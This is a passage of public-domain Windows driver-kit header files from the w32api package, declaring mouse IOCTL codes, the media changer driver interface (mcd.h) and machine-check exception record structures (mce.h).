#define IOCTL_INTERNAL_MOUSE_CONNECT \
  CTL_CODE(FILE_DEVICE_MOUSE, 0x0080, METHOD_NEITHER, FILE_ANY_ACCESS)

#define IOCTL_INTERNAL_MOUSE_DISCONNECT \
  CTL_CODE(FILE_DEVICE_MOUSE, 0x0100, METHOD_NEITHER, FILE_ANY_ACCESS)

#define IOCTL_INTERNAL_MOUSE_ENABLE \
  CTL_CODE(FILE_DEVICE_MOUSE, 0x0200, METHOD_NEITHER, FILE_ANY_ACCESS)

#define IOCTL_INTERNAL_MOUSE_DISABLE \
  CTL_CODE(FILE_DEVICE_MOUSE, 0x0400, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef struct _CONNECT_DATA {
  PDEVICE_OBJECT ClassDeviceObject;
  PVOID ClassService;
} CONNECT_DATA, *PCONNECT_DATA;

typedef VOID
(STDAPICALLTYPE *PSERVICE_CALLBACK_ROUTINE)(
  IN PVOID NormalContext,
  IN PVOID SystemArgument1,
  IN PVOID SystemArgument2,
  IN OUT PVOID SystemArgument3);

#include <wmidata.h>

```

`include/ddk/mcd.h`:

```h
/*
 * mcd.h
 *
 * Media changer driver interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#ifndef __MCD_H
#define __MCD_H

#include "srb.h"
#include "scsi.h"
#include "ntddchgr.h"

#ifdef __cplusplus
extern "C" {
#endif

#if defined(_MCD_)
#define CHANGERAPI
#else
#define CHANGERAPI DECLSPEC_IMPORT
#endif

#ifdef DebugPrint
#undef DebugPrint
#endif

#if DBG
#define DebugPrint(x) ChangerClassDebugPrint x
#else
#define DebugPrint(x)
#endif

#define MAXIMUM_CHANGER_INQUIRY_DATA			252

CHANGERAPI
PVOID
NTAPI
ChangerClassAllocatePool(
  IN POOL_TYPE  PoolType,
  IN ULONG  NumberOfBytes);

VOID
ChangerClassDebugPrint(
  ULONG  DebugPrintLevel,
  PCCHAR  DebugMessage,
  ...);

CHANGERAPI
PVOID
NTAPI
ChangerClassFreePool(
  IN PVOID  PoolToFree);

CHANGERAPI
NTSTATUS
NTAPI
ChangerClassSendSrbSynchronous(
  IN PDEVICE_OBJECT  DeviceObject,
  IN PSCSI_REQUEST_BLOCK  Srb,
  IN PVOID  Buffer,
  IN ULONG  BufferSize,
  IN BOOLEAN  WriteToDevice);


typedef NTSTATUS NTAPI
(*CHANGER_INITIALIZE)(
  IN PDEVICE_OBJECT  DeviceObject);

typedef ULONG NTAPI
(*CHANGER_EXTENSION_SIZE)(
  VOID);

typedef VOID NTAPI
(*CHANGER_ERROR_ROUTINE)(
  PDEVICE_OBJECT  DeviceObject,
  PSCSI_REQUEST_BLOCK  Srb,
  NTSTATUS  *Status,
  BOOLEAN  *Retry);

typedef NTSTATUS NTAPI
(*CHANGER_COMMAND_ROUTINE)(
  IN PDEVICE_OBJECT  DeviceObject,
  IN PIRP  Irp);

typedef NTSTATUS NTAPI
(*CHANGER_PERFORM_DIAGNOSTICS)(
  IN PDEVICE_OBJECT  DeviceObject,
  OUT PWMI_CHANGER_PROBLEM_DEVICE_ERROR  ChangerDeviceError);

typedef struct _MCD_INIT_DATA {
  ULONG  InitDataSize;
  CHANGER_EXTENSION_SIZE  ChangerAdditionalExtensionSize;
  CHANGER_INITIALIZE  ChangerInitialize;
  CHANGER_ERROR_ROUTINE  ChangerError;
  CHANGER_PERFORM_DIAGNOSTICS  ChangerPerformDiagnostics;
  CHANGER_COMMAND_ROUTINE  ChangerGetParameters;
  CHANGER_COMMAND_ROUTINE  ChangerGetStatus;
  CHANGER_COMMAND_ROUTINE  ChangerGetProductData;
  CHANGER_COMMAND_ROUTINE  ChangerSetAccess;
  CHANGER_COMMAND_ROUTINE  ChangerGetElementStatus;
  CHANGER_COMMAND_ROUTINE  ChangerInitializeElementStatus;
  CHANGER_COMMAND_ROUTINE  ChangerSetPosition;
  CHANGER_COMMAND_ROUTINE  ChangerExchangeMedium;
  CHANGER_COMMAND_ROUTINE  ChangerMoveMedium;
  CHANGER_COMMAND_ROUTINE  ChangerReinitializeUnit;
  CHANGER_COMMAND_ROUTINE  ChangerQueryVolumeTags;
} MCD_INIT_DATA, *PMCD_INIT_DATA;

CHANGERAPI
NTSTATUS
NTAPI
ChangerClassInitialize(
  IN PDRIVER_OBJECT  DriverObject,
  IN PUNICODE_STRING  RegistryPath,
  IN PMCD_INIT_DATA  MCDInitData);

#ifdef __cplusplus
}
#endif

#endif /* __MCD_H */

```

`include/ddk/mce.h`:

```h
#pragma once

#if defined(_X86_) || defined(_IA64_) || defined(_AMD64_)

typedef union _MCI_ADDR {
  _ANONYMOUS_STRUCT struct {
    ULONG Address;
    ULONG Reserved;
  } DUMMYSTRUCTNAME;
  ULONGLONG QuadPart;
} MCI_ADDR, *PMCI_ADDR;

typedef enum {
  HAL_MCE_RECORD,
  HAL_MCA_RECORD
} MCA_EXCEPTION_TYPE;

#if defined(_AMD64_)

#if (NTDDI_VERSION <= NTDDI_WINXP)

typedef union _MCI_STATS {
  struct {
    USHORT McaCod;
    USHORT ModelErrorCode;
    ULONG OtherInfo:25;
    ULONG Damage:1;
    ULONG AddressValid:1;
    ULONG MiscValid:1;
    ULONG Enabled:1;
    ULONG Uncorrected:1;
    ULONG OverFlow:1;
    ULONG Valid:1;
  } MciStatus;
  ULONG64 QuadPart;
} MCI_STATS, *PMCI_STATS;

#else

typedef union _MCI_STATS {
  struct {
    USHORT McaErrorCode;
    USHORT ModelErrorCode;
    ULONG OtherInformation:25;
    ULONG ContextCorrupt:1;
    ULONG AddressValid:1;
    ULONG MiscValid:1;
    ULONG ErrorEnabled:1;
    ULONG UncorrectedError:1;
    ULONG StatusOverFlow:1;
    ULONG Valid:1;
  } MciStatus;
  ULONG64 QuadPart;
} MCI_STATS, *PMCI_STATS;

#endif /* (NTDDI_VERSION <= NTDDI_WINXP) */

#endif /* defined(_AMD64_) */

#if defined(_X86_)
typedef union _MCI_STATS {
  struct {
    USHORT McaCod;
    USHORT MsCod;
    ULONG OtherInfo:25;
    ULONG Damage:1;
    ULONG AddressValid:1;
    ULONG MiscValid:1;
    ULONG Enabled:1;
    ULONG UnCorrected:1;
    ULONG OverFlow:1;
    ULONG Valid:1;
  } MciStats;
  ULONGLONG QuadPart;
} MCI_STATS, *PMCI_STATS;
#endif

#define MCA_EXTREG_V2MAX               24

#if defined(_X86_) || defined(_AMD64_)

#if (NTDDI_VERSION >= NTDDI_WINXP)

typedef struct _MCA_EXCEPTION {
  ULONG VersionNumber;
  MCA_EXCEPTION_TYPE ExceptionType;
  LARGE_INTEGER TimeStamp;
  ULONG ProcessorNumber;
  ULONG Reserved1;
  union {
    struct {
      UCHAR BankNumber;
      UCHAR Reserved2[7];
      MCI_STATS Status;
      MCI_ADDR Address;
      ULONGLONG Misc;
    } Mca;
    struct {
      ULONGLONG Address;
      ULONGLONG Type;
    } Mce;
  } u;
  ULONG ExtCnt;
  ULONG Reserved3;
  ULONGLONG ExtReg[MCA_EXTREG_V2MAX];
} MCA_EXCEPTION, *PMCA_EXCEPTION;

#else

typedef struct _MCA_EXCEPTION {
  ULONG VersionNumber;
  MCA_EXCEPTION_TYPE ExceptionType;
  LARGE_INTEGER TimeStamp;
  ULONG ProcessorNumber;
  ULONG Reserved1;
  union {
    struct {
      UCHAR BankNumber;
      UCHAR Reserved2[7];
      MCI_STATS Status;
      MCI_ADDR Address;
      ULONGLONG Misc;
    } Mca;
    struct {
      ULONGLONG Address;
      ULONGLONG Type;
    } Mce;
  } u;
} MCA_EXCEPTION, *PMCA_EXCEPTION;

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

typedef MCA_EXCEPTION CMC_EXCEPTION, *PCMC_EXCEPTION;
typedef MCA_EXCEPTION CPE_EXCEPTION, *PCPE_EXCEPTION;

#if (NTDDI_VERSION >= NTDDI_WINXP)
#define MCA_EXCEPTION_V1_SIZE FIELD_OFFSET(MCA_EXCEPTION, ExtCnt)
#define MCA_EXCEPTION_V2_SIZE sizeof(struct _MCA_EXCEPTION)
#endif

#endif /* defined(_X86_) || defined(_AMD64_) */

#if defined(_AMD64_) || defined(_IA64_)

typedef UCHAR ERROR_SEVERITY, *PERROR_SEVERITY;

typedef enum _ERROR_SEVERITY_VALUE {
  ErrorRecoverable = 0,
  ErrorFatal = 1,
  ErrorCorrected = 2,
  ErrorOthers = 3,
} ERROR_SEVERITY_VALUE;

#endif

#if defined(_IA64_)

typedef union _ERROR_REVISION {
  USHORT Revision;
  _ANONYMOUS_STRUCT struct {
    UCHAR Minor;
    UCHAR Major;
  } DUMMYSTRUCTNAME;
} ERROR_REVISION, *PERROR_REVISION;

#if (NTDDI_VERSION > NTDDI_WINXP)
#define ERROR_MAJOR_REVISION_SAL_03_00      0
#define ERROR_MINOR_REVISION_SAL_03_00      2
#define ERROR_REVISION_SAL_03_00 {ERROR_MINOR_REVISION_SAL_03_00,ERROR_MAJOR_REVISION_SAL_03_00}
#define ERROR_FIXED_SECTION_REVISION {2,0}
#else
#define ERROR_REVISION_SAL_03_00 {2,0}
#endif /* (NTDDI_VERSION > NTDDI_WINXP) */

typedef union _ERROR_TIMESTAMP {
  ULONGLONG TimeStamp;
  _ANONYMOUS_STRUCT struct {
    UCHAR Seconds;
    UCHAR Minutes;
    UCHAR Hours;
    UCHAR Reserved;
    UCHAR Day;
    UCHAR Month;
    UCHAR Year;
    UCHAR Century;
  } DUMMYSTRUCTNAME;
} ERROR_TIMESTAMP, *PERROR_TIMESTAMP;

typedef struct _ERROR_GUID {
  ULONG Data1;
  USHORT Data2;
  USHORT Data3;
  UCHAR Data4[8];
} ERROR_GUID, *PERROR_GUID;

typedef ERROR_GUID            _ERROR_DEVICE_GUID;
typedef _ERROR_DEVICE_GUID    ERROR_DEVICE_GUID, *PERROR_DEVICE_GUID;

typedef ERROR_GUID            _ERROR_PLATFORM_GUID;
typedef _ERROR_PLATFORM_GUID  ERROR_PLATFORM_GUID, *PERROR_PLATFORM_GUID;

typedef union _ERROR_RECORD_VALID {
  UCHAR Valid;
  _ANONYMOUS_STRUCT struct {
    UCHAR OemPlatformID:1;
    UCHAR Reserved:7;
  } DUMMYSTRUCTNAME;
} ERROR_RECORD_VALID, *PERROR_RECORD_VALID;

typedef struct _ERROR_RECORD_HEADER {
  ULONGLONG Id;
  ERROR_REVISION Revision;
  ERROR_SEVERITY ErrorSeverity;
  ERROR_RECORD_VALID Valid;
  ULONG Length;
  ERROR_TIMESTAMP TimeStamp;
  UCHAR OemPlatformId[16];
} ERROR_RECORD_HEADER, *PERROR_RECORD_HEADER;

typedef union _ERROR_RECOVERY_INFO {
  UCHAR RecoveryInfo;
  _ANONYMOUS_STRUCT struct {
    UCHAR Corrected:1;
    UCHAR NotContained:1;
    UCHAR Reset:1;
    UCHAR Reserved:4;
    UCHAR Valid:1;
  } DUMMYSTRUCTNAME;
} ERROR_RECOVERY_INFO, *PERROR_RECOVERY_INFO;

typedef struct _ERROR_SECTION_HEADER {
  ERROR_DEVICE_GUID Guid;
  ERROR_REVISION Revision;
  ERROR_RECOVERY_INFO RecoveryInfo;
  UCHAR Reserved;
  ULONG Length;
} ERROR_SECTION_HEADER, *PERROR_SECTION_HEADER;

#if !defined(__midl)
__inline
USHORT
NTAPI
GetFwMceLogProcessorNumber(
  PERROR_RECORD_HEADER Log)
{
  PERROR_SECTION_HEADER section = (PERROR_SECTION_HEADER)((ULONG64)Log + sizeof(*Log));
  USHORT lid = (USHORT)((UCHAR)(section->Reserved));
#ifdef NONAMELESSUNION
  lid |= (USHORT)((UCHAR)(Log->TimeStamp.s.Reserved) << 8);
#else
  lid |= (USHORT)((UCHAR)(Log->TimeStamp.Reserved) << 8);
#endif
  return( lid );
}
#endif /* !__midl */

#define ERROR_PROCESSOR_GUID {0xe429faf1, 0x3cb7, 0x11d4, {0xbc, 0xa7, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81}}

typedef union _ERROR_MODINFO_VALID {
  ULONGLONG Valid;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG CheckInfo:1;
    ULONGLONG RequestorIdentifier:1;
    ULONGLONG ResponderIdentifier:1;
    ULONGLONG TargetIdentifier:1;
    ULONGLONG PreciseIP:1;
    ULONGLONG Reserved:59;
  } DUMMYSTRUCTNAME;
} ERROR_MODINFO_VALID, *PERROR_MODINFO_VALID;

typedef enum _ERROR_CHECK_IS {
  isIA64 = 0,
  isIA32 = 1,
} ERROR_CHECK_IS;

typedef enum _ERROR_CACHE_CHECK_OPERATION {
  CacheUnknownOp = 0,
  CacheLoad = 1,
  CacheStore = 2,
  CacheInstructionFetch = 3,
  CacheDataPrefetch = 4,
  CacheSnoop = 5,
  CacheCastOut = 6,
  CacheMoveIn = 7,
} ERROR_CACHE_CHECK_OPERATION;

typedef enum _ERROR_CACHE_CHECK_MESI {
  CacheInvalid = 0,
  CacheHeldShared = 1,
  CacheHeldExclusive = 2,
  CacheModified = 3,
} ERROR_CACHE_CHECK_MESI;

#if (NTDDI_VERSION >= NTDDI_VISTA)

typedef union _ERROR_CACHE_CHECK {
  ULONGLONG CacheCheck;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG Operation:4;
    ULONGLONG Level:2;
    ULONGLONG Reserved1:2;
    ULONGLONG DataLine:1;
    ULONGLONG TagLine:1;
    ULONGLONG DataCache:1;
    ULONGLONG InstructionCache:1;
    ULONGLONG MESI:3;
    ULONGLONG MESIValid:1;
    ULONGLONG Way:5;
    ULONGLONG WayIndexValid:1;
    ULONGLONG Reserved2:1;
    ULONGLONG DP:1;
    ULONGLONG Reserved3:8;
    ULONGLONG Index:20;
    ULONGLONG Reserved4:2;
    ULONGLONG InstructionSet:1;
    ULONGLONG InstructionSetValid:1;
    ULONGLONG PrivilegeLevel:2;
    ULONGLONG PrivilegeLevelValid:1;
    ULONGLONG MachineCheckCorrected:1;
    ULONGLONG TargetAddressValid:1;
    ULONGLONG RequestIdValid:1;
    ULONGLONG ResponderIdValid:1;
    ULONGLONG PreciseIPValid:1;
  } DUMMYSTRUCTNAME;
} ERROR_CACHE_CHECK, *PERROR_CACHE_CHECK;

# else

typedef union _ERROR_CACHE_CHECK {
  ULONGLONG CacheCheck;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG Operation:4;
    ULONGLONG Level:2;
    ULONGLONG Reserved1:2;
    ULONGLONG DataLine:1;
    ULONGLONG TagLine:1;
    ULONGLONG DataCache:1;
    ULONGLONG InstructionCache:1;
    ULONGLONG MESI:3;
    ULONGLONG MESIValid:1;
    ULONGLONG Way:5;
    ULONGLONG WayIndexValid:1;
    ULONGLONG Reserved2:10;
    ULONGLONG Index:20;
    ULONGLONG Reserved3:2;
    ULONGLONG InstructionSet:1;
    ULONGLONG InstructionSetValid:1;
    ULONGLONG PrivilegeLevel:2;
    ULONGLONG PrivilegeLevelValid:1;
    ULONGLONG MachineCheckCorrected:1;
    ULONGLONG TargetAddressValid:1;
    ULONGLONG RequestIdValid:1;
    ULONGLONG ResponderIdValid:1;
    ULONGLONG PreciseIPValid:1;
  } DUMMYSTRUCTNAME;
} ERROR_CACHE_CHECK, *PERROR_CACHE_CHECK;

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

typedef enum _ERROR_TLB_CHECK_OPERATION {
  TlbUnknownOp = 0,
  TlbAccessWithLoad = 1,
  TlbAccessWithStore = 2,
  TlbAccessWithInstructionFetch = 3,
  TlbAccessWithDataPrefetch = 4,
  TlbShootDown = 5,
  TlbProbe = 6,
  TlbVhptFill = 7,
  TlbPurge = 8,
} ERROR_TLB_CHECK_OPERATION;

typedef union _ERROR_TLB_CHECK {
  ULONGLONG TlbCheck;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG TRSlot:8;
    ULONGLONG TRSlotValid:1;
    ULONGLONG Reserved1:1;
    ULONGLONG Level:2;
    ULONGLONG Reserved2:4;
    ULONGLONG DataTransReg:1;
    ULONGLONG InstructionTransReg:1;
    ULONGLONG DataTransCache:1;
    ULONGLONG InstructionTransCache:1;
    ULONGLONG Operation:4;
    ULONGLONG Reserved3:30;
    ULONGLONG InstructionSet:1;
    ULONGLONG InstructionSetValid:1;
    ULONGLONG PrivilegeLevel:2;
    ULONGLONG PrivilegeLevelValid:1;
    ULONGLONG MachineCheckCorrected:1;
    ULONGLONG TargetAddressValid:1;
    ULONGLONG RequestIdValid:1;
    ULONGLONG ResponderIdValid:1;
    ULONGLONG PreciseIPValid:1;
  } DUMMYSTRUCTNAME;
} ERROR_TLB_CHECK, *PERROR_TLB_CHECK;

typedef enum _ERROR_BUS_CHECK_OPERATION {
  BusUnknownOp = 0,
  BusPartialRead = 1,
  BusPartialWrite = 2,
  BusFullLineRead = 3,
  BusFullLineWrite = 4,
  BusWriteBack = 5,
  BusSnoopProbe = 6,
  BusIncomingPtcG = 7,
  BusWriteCoalescing = 8,
} ERROR_BUS_CHECK_OPERATION;

#if (NTDDI_VERSION >= NTDDI_VISTA)

typedef union _ERROR_BUS_CHECK {
  ULONGLONG BusCheck;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG Size:5;
    ULONGLONG Internal:1;
    ULONGLONG External:1;
    ULONGLONG CacheTransfer:1;
    ULONGLONG Type:8;
    ULONGLONG Severity:5;
    ULONGLONG Hierarchy:2;
    ULONGLONG DP:1;
    ULONGLONG Status:8;
    ULONGLONG Reserved1:22;
    ULONGLONG InstructionSet:1;
    ULONGLONG InstructionSetValid:1;
    ULONGLONG PrivilegeLevel:2;
    ULONGLONG PrivilegeLevelValid:1;
    ULONGLONG MachineCheckCorrected:1;
    ULONGLONG TargetAddressValid:1;
    ULONGLONG RequestIdValid:1;
    ULONGLONG ResponderIdValid:1;
    ULONGLONG PreciseIPValid:1;
  } DUMMYSTRUCTNAME;
} ERROR_BUS_CHECK, *PERROR_BUS_CHECK;

#else

typedef union _ERROR_BUS_CHECK {
  ULONGLONG BusCheck;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG Size:5;
    ULONGLONG Internal:1;
    ULONGLONG External:1;
    ULONGLONG CacheTransfer:1;
    ULONGLONG Type:8;
    ULONGLONG Severity:5;
    ULONGLONG Hierarchy:2;
    ULONGLONG Reserved1:1;
    ULONGLONG Status:8;
    ULONGLONG Reserved2:22;
    ULONGLONG InstructionSet:1;
    ULONGLONG InstructionSetValid:1;
    ULONGLONG PrivilegeLevel:2;
    ULONGLONG PrivilegeLevelValid:1;
    ULONGLONG MachineCheckCorrected:1;
    ULONGLONG TargetAddressValid:1;
    ULONGLONG RequestIdValid:1;
    ULONGLONG ResponderIdValid:1;
    ULONGLONG PreciseIPValid:1;
  } DUMMYSTRUCTNAME;
} ERROR_BUS_CHECK, *PERROR_BUS_CHECK;

#endif

typedef enum _ERROR_REGFILE_CHECK_IDENTIFIER {
  RegFileUnknownId = 0,
  GeneralRegisterBank1 = 1,
  GeneralRegisterBank0 = 2,
  FloatingPointRegister = 3,
  BranchRegister = 4,
  PredicateRegister = 5,
  ApplicationRegister = 6,
  ControlRegister = 7,
  RegionRegister = 8,
  ProtectionKeyRegister = 9,
  DataBreakPointRegister = 10,
  InstructionBreakPointRegister = 11,
  PerformanceMonitorControlRegister = 12,
  PerformanceMonitorDataRegister = 13,
} ERROR_REGFILE_CHECK_IDENTIFIER;

typedef enum _ERROR_REGFILE_CHECK_OPERATION {
  RegFileUnknownOp = 0,
  RegFileRead = 1,
  RegFileWrite = 2,
} ERROR_REGFILE_CHECK_OPERATION;

typedef union _ERROR_REGFILE_CHECK {
  ULONGLONG RegFileCheck;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG Identifier:4;
    ULONGLONG Operation:4;
    ULONGLONG RegisterNumber:7;
    ULONGLONG RegisterNumberValid:1;
    ULONGLONG Reserved1:38;
    ULONGLONG InstructionSet:1;
    ULONGLONG InstructionSetValid:1;
    ULONGLONG PrivilegeLevel:2;
    ULONGLONG PrivilegeLevelValid:1;
    ULONGLONG MachineCheckCorrected:1;
    ULONGLONG Reserved2:3;
    ULONGLONG PreciseIPValid:1;
  } DUMMYSTRUCTNAME;
} ERROR_REGFILE_CHECK, *PERROR_REGFILE_CHECK;

#if (NTDDK_VERSION <= WINXP)
typedef enum _ERROR_MS_CHECK_OPERATION {
  MsUnknownOp = 0,
  MsReadOrLoad = 1,
  MsWriteOrStore = 2
} ERROR_MS_CHECK_OPERATION;
#else
typedef enum _ERROR_MS_CHECK_OPERATION {
  MsUnknownOp = 0,
  MsReadOrLoad = 1,
  MsWriteOrStore = 2,
  MsOverTemperature = 3,
  MsNormalTemperature = 4
} ERROR_MS_CHECK_OPERATION;
#endif

typedef union _ERROR_MS_CHECK {
  ULONGLONG MsCheck;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG StructureIdentifier:5;
    ULONGLONG Level:3;
    ULONGLONG ArrayId:4;
    ULONGLONG Operation:4;
    ULONGLONG Way:6;
    ULONGLONG WayValid:1;
    ULONGLONG IndexValid:1;
    ULONGLONG Reserved1:8;
    ULONGLONG Index:8;
    ULONGLONG Reserved2:14;
    ULONGLONG InstructionSet:1;
    ULONGLONG InstructionSetValid:1;
    ULONGLONG PrivilegeLevel:2;
    ULONGLONG PrivilegeLevelValid:1;
    ULONGLONG MachineCheckCorrected:1;
    ULONGLONG TargetAddressValid:1;
    ULONGLONG RequestIdValid:1;
    ULONGLONG ResponderIdValid:1;
    ULONGLONG PreciseIPValid:1;
  } DUMMYSTRUCTNAME;
} ERROR_MS_CHECK, *PERROR_MS_CHECK;

typedef union _ERROR_CHECK_INFO {
  ULONGLONG CheckInfo;
  ERROR_CACHE_CHECK CacheCheck;
  ERROR_TLB_CHECK TlbCheck;
  ERROR_BUS_CHECK BusCheck;
  ERROR_REGFILE_CHECK RegFileCheck;
  ERROR_MS_CHECK MsCheck;
} ERROR_CHECK_INFO, *PERROR_CHECK_INFO;

typedef struct _ERROR_MODINFO {
  ERROR_MODINFO_VALID Valid;
  ERROR_CHECK_INFO CheckInfo;
  ULONGLONG RequestorId;
  ULONGLONG ResponderId;
  ULONGLONG TargetId;
  ULONGLONG PreciseIP;
} ERROR_MODINFO, *PERROR_MODINFO;

typedef union _ERROR_PROCESSOR_VALID {
  ULONGLONG Valid;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG ErrorMap:1;
    ULONGLONG StateParameter:1;
    ULONGLONG CRLid:1;
    ULONGLONG StaticStruct:1;
    ULONGLONG CacheCheckNum:4;
    ULONGLONG TlbCheckNum:4;
    ULONGLONG BusCheckNum:4;
    ULONGLONG RegFileCheckNum:4;
    ULONGLONG MsCheckNum:4;
    ULONGLONG CpuIdInfo:1;
    ULONGLONG Reserved:39;
  } DUMMYSTRUCTNAME;
} ERROR_PROCESSOR_VALID, *PERROR_PROCESSOR_VALID;

typedef union _ERROR_PROCESSOR_ERROR_MAP {
  ULONGLONG ErrorMap;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG   Cid:4;
    ULONGLONG   Tid:4;
    ULONGLONG   Eic:4;
    ULONGLONG   Edc:4;
    ULONGLONG   Eit:4;
    ULONGLONG   Edt:4;
    ULONGLONG   Ebh:4;
    ULONGLONG   Erf:4;
    ULONGLONG   Ems:16;
    ULONGLONG   Reserved:16;
  } DUMMYSTRUCTNAME;
} ERROR_PROCESSOR_ERROR_MAP, *PERROR_PROCESSOR_ERROR_MAP;

typedef ERROR_PROCESSOR_ERROR_MAP    _ERROR_PROCESSOR_LEVEL_INDEX;
typedef _ERROR_PROCESSOR_LEVEL_INDEX ERROR_PROCESSOR_LEVEL_INDEX, *PERROR_PROCESSOR_LEVEL_INDEX;

typedef union _ERROR_PROCESSOR_STATE_PARAMETER {
  ULONGLONG   StateParameter;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG reserved0:2;
    ULONGLONG rz:1;
    ULONGLONG ra:1;
    ULONGLONG me:1;
    ULONGLONG mn:1;
    ULONGLONG sy:1;
    ULONGLONG co:1;
    ULONGLONG ci:1;
    ULONGLONG us:1;
    ULONGLONG hd:1;
    ULONGLONG tl:1;
    ULONGLONG mi:1;
    ULONGLONG pi:1;
    ULONGLONG pm:1;
    ULONGLONG dy:1;
    ULONGLONG in:1;
    ULONGLONG rs:1;
    ULONGLONG cm:1;
    ULONGLONG ex:1;
    ULONGLONG cr:1;
    ULONGLONG pc:1;
    ULONGLONG dr:1;
    ULONGLONG tr:1;
    ULONGLONG rr:1;
    ULONGLONG ar:1;
    ULONGLONG br:1;
    ULONGLONG pr:1;
    ULONGLONG fp:1;
    ULONGLONG b1:1;
    ULONGLONG b0:1;
    ULONGLONG gr:1;
    ULONGLONG dsize:16;
    ULONGLONG reserved1:11;
    ULONGLONG cc:1;
    ULONGLONG tc:1;
    ULONGLONG bc:1;
    ULONGLONG rc:1;
    ULONGLONG uc:1;
  } DUMMYSTRUCTNAME;
} ERROR_PROCESSOR_STATE_PARAMETER, *PERROR_PROCESSOR_STATE_PARAMETER;

typedef union _PROCESSOR_LOCAL_ID {
  ULONGLONG LocalId;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG reserved:16;
    ULONGLONG eid:8;
    ULONGLONG id:8;
    ULONGLONG ignored:32;
  } DUMMYSTRUCTNAME;
} PROCESSOR_LOCAL_ID, *PPROCESSOR_LOCAL_ID;

typedef struct _ERROR_PROCESSOR_MS {
  ULONGLONG MsError[1];
} ERROR_PROCESSOR_MS, *PERROR_PROCESSOR_MS;

typedef struct _ERROR_PROCESSOR_CPUID_INFO {
  ULONGLONG CpuId0;
  ULONGLONG CpuId1;
  ULONGLONG CpuId2;
  ULONGLONG CpuId3;
  ULONGLONG CpuId4;
  ULONGLONG Reserved;
} ERROR_PROCESSOR_CPUID_INFO, *PERROR_PROCESSOR_CPUID_INFO;

typedef union _ERROR_PROCESSOR_STATIC_INFO_VALID {
  ULONGLONG Valid;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG MinState:1;
    ULONGLONG BR:1;
    ULONGLONG CR:1;
    ULONGLONG AR:1;
    ULONGLONG RR:1;
    ULONGLONG FR:1;
    ULONGLONG Reserved:58;
  } DUMMYSTRUCTNAME;
} ERROR_PROCESSOR_STATIC_INFO_VALID, *PERROR_PROCESSOR_STATIC_INFO_VALID;

typedef struct _ERROR_PROCESSOR_STATIC_INFO {
  ERROR_PROCESSOR_STATIC_INFO_VALID Valid;
  UCHAR MinState[1024];
  ULONGLONG BR[8];
  ULONGLONG CR[128];
  ULONGLONG AR[128];
  ULONGLONG RR[8];
  ULONGLONG FR[2 * 128];
} ERROR_PROCESSOR_STATIC_INFO, *PERROR_PROCESSOR_STATIC_INFO;

typedef struct _ERROR_PROCESSOR {
  ERROR_SECTION_HEADER Header;
  ERROR_PROCESSOR_VALID Valid;
  ERROR_PROCESSOR_ERROR_MAP ErrorMap;
  ERROR_PROCESSOR_STATE_PARAMETER StateParameter;
  PROCESSOR_LOCAL_ID CRLid;
} ERROR_PROCESSOR, *PERROR_PROCESSOR;

#define ERROR_PROCESSOR_STATE_PARAMETER_CACHE_CHECK_SHIFT         59
#define ERROR_PROCESSOR_STATE_PARAMETER_CACHE_CHECK_MASK          0x1
#define ERROR_PROCESSOR_STATE_PARAMETER_TLB_CHECK_SHIFT           60
#define ERROR_PROCESSOR_STATE_PARAMETER_TLB_CHECK_MASK            0x1
#define ERROR_PROCESSOR_STATE_PARAMETER_BUS_CHECK_SHIFT           61
#define ERROR_PROCESSOR_STATE_PARAMETER_BUS_CHECK_MASK            0x1
#define ERROR_PROCESSOR_STATE_PARAMETER_REG_CHECK_SHIFT           62
#define ERROR_PROCESSOR_STATE_PARAMETER_REG_CHECK_MASK            0x1
#define ERROR_PROCESSOR_STATE_PARAMETER_MICROARCH_CHECK_SHIFT     63
#define ERROR_PROCESSOR_STATE_PARAMETER_MICROARCH_CHECK_MASK      0x1

#define ERROR_PROCESSOR_STATE_PARAMETER_UNKNOWN_CHECK_SHIFT       ERROR_PROCESSOR_STATE_PARAMETER_MICROARCH_CHECK_SHIFT
#define ERROR_PROCESSOR_STATE_PARAMETER_UNKNOWN_CHECK_MASK        ERROR_PROCESSOR_STATE_PARAMETER_MICROARCH_CHECK_MASK

typedef enum _ERR_TYPES {
  ERR_INTERNAL = 1,
  ERR_BUS = 16,
  ERR_MEM = 4,
  ERR_TLB = 5,
  ERR_CACHE = 6,
  ERR_FUNCTION = 7,
  ERR_SELFTEST = 8,
  ERR_FLOW = 9,
  ERR_MAP = 17,
  ERR_IMPROPER = 18,
  ERR_UNIMPL = 19,
  ERR_LOL = 20,
  ERR_RESPONSE = 21,
  ERR_PARITY = 22,
  ERR_PROTOCOL = 23,
  ERR_ERROR = 24,
  ERR_TIMEOUT = 25,
  ERR_POISONED = 26,
} _ERR_TYPE;

typedef union _ERROR_STATUS {
  ULONGLONG Status;
  _ANONYMOUS_STRUCT struct {
    ULONGLONG Reserved0:8;
    ULONGLONG Type:8;
    ULONGLONG Address:1;
    ULONGLONG Control:1;
    ULONGLONG Data:1;
    ULONGLONG Responder:1;
    ULONGLONG Requestor:1;
    ULONGLONG FirstError:1;
    ULONGLONG Overflow:1;
    ULONGLONG Reserved1:41;
  } DUMMYSTRUCTNAME;
} ERROR_STATUS, *PERROR_STATUS;

typedef struct _ERROR_OEM_DATA {
  USHORT Length;
} ERROR_OEM_DATA, *PERROR_OEM_DATA;

